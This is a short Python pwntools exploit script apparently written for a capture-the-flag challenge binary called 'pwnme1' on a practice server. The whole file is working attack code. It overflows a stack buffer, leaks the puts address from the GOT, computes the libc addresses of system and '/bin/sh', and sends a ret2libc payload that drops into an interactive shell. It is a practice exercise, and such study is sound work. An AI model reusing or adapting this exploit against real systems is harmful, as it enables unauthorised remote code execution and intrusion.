from pwn import *


# p = process("./pwnme1")
p = remote("node4.buuoj.cn", 29545)
pro = ELF("./pwnme1")


puts_p = pro.plt["puts"]
puts_g = pro.got["puts"]
vuln = 0x08048624

# leak
p.sendlineafter(">> 6. Exit    \n", "5")
pad = cyclic(0xa4+0x4)+p32(puts_p)+p32(vuln)+p32(puts_g)
p.sendlineafter("Please input the name of fruit:", pad)
info = u32(p.recvuntil("\xf7")[-4:])
print("leak: ", hex(info))

# count
libc = ELF("/home/fanxinli/libc-so/libc-2.23-32.so")
system = info-libc.sym["puts"]+libc.sym["system"]
binsh = info-libc.sym["puts"]+next(libc.search(b"/bin/sh\x00"))

# attack
pad = cyclic(0xa4+0x4)+p32(system)+p32(0)+p32(binsh)
p.sendline(pad)

p.interactive()


